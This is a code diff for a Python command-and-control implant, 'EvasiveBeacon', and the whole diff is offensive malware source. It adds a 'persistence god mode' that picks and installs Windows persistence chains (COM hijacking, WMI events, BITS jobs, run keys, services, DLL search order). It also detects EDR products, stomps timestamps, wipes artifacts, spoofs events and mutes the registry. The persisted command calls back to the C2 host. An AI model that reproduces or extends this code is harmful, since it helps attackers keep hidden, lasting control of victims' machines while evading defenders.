@@ -98,6 +98,33 @@ except ImportError:
     ObfuscationLayer = None
     print("[!] Syscall obfuscation monster not available")
 
+# NEW: Import persistence god mode
+try:
+    from evasion.persistence_god import (
+        PersistenceGodMonster,
+        AIPersistenceSelector,
+        PersistenceChainExecutor,
+        ArtifactMutator,
+        SpoofEventGenerator,
+        TimestampStomper,
+        PersistenceArtifactWiper,
+        PersistenceChain,
+        EDRPersistProfile,
+        MutationTarget,
+        SpoofEventType,
+        PersistenceConfig,
+        create_persistence_god,
+        quick_persist,
+        get_ai_persist_recommendation,
+        detect_edr_for_persist
+    )
+    PERSISTENCE_GOD_AVAILABLE = True
+except ImportError:
+    PERSISTENCE_GOD_AVAILABLE = False
+    PersistenceGodMonster = None
+    PersistenceChain = None
+    print("[!] Persistence god mode not available")
+
 
 @dataclass
 class BeaconConfig:
@@ -136,6 +163,16 @@ class BeaconConfig:
     syscall_use_fresh_ssn: bool = True
     syscall_enable_spoof: bool = True
     syscall_junk_ratio: float = 0.5
+    # NEW: Persistence god mode settings
+    enable_persistence_god: bool = True
+    persistence_chain: str = "ai_select"  # ai_select, bits_job, com_hijack, runkey, full_chain, etc.
+    persistence_ai_adaptive: bool = True
+    persistence_multi_chain: bool = True
+    persistence_mutation_rate: float = 0.8
+    persistence_enable_spoof: bool = True
+    persistence_timestamp_stomp: bool = True
+    persistence_artifact_wipe: bool = True
+    persistence_use_reg_muting: bool = True
 
 
 @dataclass
@@ -195,6 +232,11 @@ class EvasiveBeacon:
         self.syscall_obfuscator = None
         if SYSCALL_OBFUSCATOR_AVAILABLE and config.enable_syscall_obfuscation:
             self._init_syscall_obfuscator()
+        
+        # NEW: Initialize persistence god engine
+        self.persistence_god = None
+        if PERSISTENCE_GOD_AVAILABLE and config.enable_persistence_god:
+            self._init_persistence_god()
         
         # Task handlers
         self.task_handlers: Dict[str, Callable] = {
@@ -364,6 +406,70 @@ class EvasiveBeacon:
         except Exception as e:
             print(f"[!] Failed to initialize syscall obfuscator: {e}")
             self.syscall_obfuscator = None
+    
+    def _init_persistence_god(self):
+        """Initialize persistence god mode engine"""
+        if not PERSISTENCE_GOD_AVAILABLE:
+            return
+        
+        try:
+            # Parse chain
+            chain = None
+            if self.config.persistence_chain != "ai_select":
+                chain_map = {
+                    'wmi_event': PersistenceChain.WMI_EVENT,
+                    'com_hijack': PersistenceChain.COM_HIJACK,
+                    'bits_job': PersistenceChain.BITS_JOB,
+                    'schtask': PersistenceChain.SCHTASK,
+                    'runkey': PersistenceChain.RUNKEY,
+                    'service': PersistenceChain.SERVICE,
+                    'dll_search': PersistenceChain.DLL_SEARCH_ORDER,
+                    'startup_folder': PersistenceChain.STARTUP_FOLDER,
+                    'full_chain': PersistenceChain.FULL_CHAIN,
+                }
+                chain = chain_map.get(
+                    self.config.persistence_chain.lower(),
+                    None
+                )
+            
+            # Create config
+            persist_config = PersistenceConfig(
+                ai_adaptive=self.config.persistence_ai_adaptive or self.config.persistence_chain == "ai_select",
+                enable_multi_chain=self.config.persistence_multi_chain,
+                enable_spoof_events=self.config.persistence_enable_spoof,
+                mutation_rate=self.config.persistence_mutation_rate,
+                timestamp_stomp=self.config.persistence_timestamp_stomp,
+                artifact_wipe=self.config.persistence_artifact_wipe,
+                use_reg_muting=self.config.persistence_use_reg_muting,
+            )
+            
+            # Create engine
+            self.persistence_god = PersistenceGodMonster(persist_config)
+            
+            # Get AI recommendation
+            selector = AIPersistenceSelector()
+            rec_chain, profile_info = selector.detect_and_select()
+            
+            profile = profile_info.get('profile', {})
+            
+            print(f"[+] Persistence god initialized: AI={self.config.persistence_ai_adaptive}")
+            print(f"    Primary chain: {rec_chain.value}")
+            print(f"    Detected EDR: {profile.get('name', 'None')}")
+            print(f"    Multi-chain: {self.config.persistence_multi_chain}")
+            print(f"    Mutation rate: {self.config.persistence_mutation_rate}")
+            print(f"    Spoof events: {self.config.persistence_enable_spoof}")
+            print(f"    Timestamp stomp: {self.config.persistence_timestamp_stomp}")
+            print(f"    Artifact wipe: {self.config.persistence_artifact_wipe}")
+            print(f"    Registry muting: {self.config.persistence_use_reg_muting}")
+            
+            # Show recommendation
+            rec = selector.get_recommendation()
+            if rec:
+                print(f"    AI Recommendation: {rec[:100]}...")
+            
+        except Exception as e:
+            print(f"[!] Failed to initialize persistence god: {e}")
+            self.persistence_god = None
     
     def _init_evasion(self):
         """Initialize evasion components"""
@@ -767,9 +873,32 @@ class EvasiveBeacon:
         return f"Keylogger action: {action}"
     
     def _handle_persist(self, task: Dict) -> str:
-        """Establish persistence"""
-        method = task.get('method', 'registry')
+        """
+        Establish persistence using Persistence God Mode.
         
+        Supports:
+        - AI-adaptive chain selection
+        - Multi-chain persistence
+        - Artifact mutation
+        - Spoof events
+        - Timestamp stomping
+        - Artifact wiping
+        """
+        method = task.get('method', 'ai_select')
+        payload_path = task.get('payload_path', os.path.abspath(__file__))
+        callback_host = task.get('callback_host', self.config.c2_host)
+        callback_port = task.get('callback_port', self.config.c2_port)
+        
+        # Use persistence god if available and on Windows
+        if self.persistence_god and platform.system() == "Windows":
+            return self._persist_god_mode(
+                method=method,
+                payload_path=payload_path,
+                callback_host=callback_host,
+                callback_port=callback_port
+            )
+        
+        # Fallback to legacy methods
         if platform.system() != "Windows":
             # Linux persistence
             if method == 'cron':
@@ -777,13 +906,119 @@ class EvasiveBeacon:
             elif method == 'bashrc':
                 return self._persist_bashrc()
         else:
-            # Windows persistence
+            # Windows persistence (legacy)
             if method == 'registry':
                 return self._persist_registry()
             elif method == 'schtasks':
                 return self._persist_schtasks()
         
         return f"Persistence method {method} not implemented"
+    
+    def _persist_god_mode(
+        self,
+        method: str = "ai_select",
+        payload_path: str = None,
+        callback_host: str = None,
+        callback_port: int = None
+    ) -> str:
+        """
+        Install persistence using Persistence God Mode.
+        
+        Full chain with AI-adaptive selection, mutation, spoof, and wipe.
+        """
+        if not self.persistence_god:
+            return "Persistence God not available"
+        
+        try:
+            # Build payload callback
+            if not payload_path:
+                payload_path = os.path.abspath(__file__)
+            
+            callback = f"pythonw.exe {payload_path}"
+            if callback_host and callback_port:
+                callback = f"pythonw.exe {payload_path} --c2 {callback_host}:{callback_port}"
+            
+            # Determine chain
+            if method == "ai_select" or method == "full_chain":
+                # Use AI-selected full chain
+                result = self.persistence_god.persist(
+                    payload_callback=callback,
+                    use_full_chain=method == "full_chain"
+                )
+            else:
+                # Map to specific chain
+                chain_map = {
+                    'wmi_event': PersistenceChain.WMI_EVENT,
+                    'wmi': PersistenceChain.WMI_EVENT,
+                    'com_hijack': PersistenceChain.COM_HIJACK,
+                    'com': PersistenceChain.COM_HIJACK,
+                    'bits_job': PersistenceChain.BITS_JOB,
+                    'bits': PersistenceChain.BITS_JOB,
+                    'schtask': PersistenceChain.SCHTASK,
+                    'scheduled_task': PersistenceChain.SCHTASK,
+                    'runkey': PersistenceChain.RUNKEY,
+                    'registry': PersistenceChain.RUNKEY,
+                    'service': PersistenceChain.SERVICE,
+                    'dll_search': PersistenceChain.DLL_SEARCH_ORDER,
+                    'dll': PersistenceChain.DLL_SEARCH_ORDER,
+                    'startup_folder': PersistenceChain.STARTUP_FOLDER,
+                    'startup': PersistenceChain.STARTUP_FOLDER,
+                }
+                
+                chain = chain_map.get(method.lower(), PersistenceChain.RUNKEY)
+                
+                # Install specific chain
+                result = self.persistence_god.persist(
+                    payload_callback=callback,
+                    chain=chain
+                )
+            
+            # Build response
+            if result.get('success'):
+                installed = result.get('chains_installed', [])
+                artifacts = result.get('mutated_artifacts', [])
+                spoofed = result.get('spoofed_events', 0)
+                wiped = result.get('artifacts_wiped', [])
+                
+                response = [
+                    f"Persistence God Mode: SUCCESS",
+                    f"  Chains installed: {', '.join(installed)}",
+                    f"  Artifacts mutated: {len(artifacts)}",
+                    f"  Spoof events: {spoofed}",
+                    f"  Artifacts wiped: {len(wiped)}",
+                ]
+                
+                if result.get('detected_edr'):
+                    response.append(f"  Detected EDR: {result['detected_edr']}")
+                
+                return "\n".join(response)
+            else:
+                return f"Persistence God Mode FAILED: {result.get('error', 'Unknown error')}"
+                
+        except Exception as e:
+            return f"Persistence God Mode ERROR: {str(e)}"
+    
+    def get_persistence_status(self) -> Dict[str, Any]:
+        """
+        Get status of installed persistence chains.
+        
+        Returns:
+            Dict with persistence status info
+        """
+        result = {
+            'persistence_god_available': self.persistence_god is not None,
+            'chains_installed': [],
+            'ai_recommendation': None,
+            'detected_edr': None,
+        }
+        
+        if self.persistence_god:
+            # Get current state from persistence god
+            result['chains_installed'] = self.persistence_god.get_installed_chains()
+            result['ai_recommendation'] = self.persistence_god.get_ai_recommendation()
+            result['detected_edr'] = self.persistence_god.detected_edr
+        
+        return result
     
     def _persist_cron(self) -> str:
         """Linux cron persistence"""
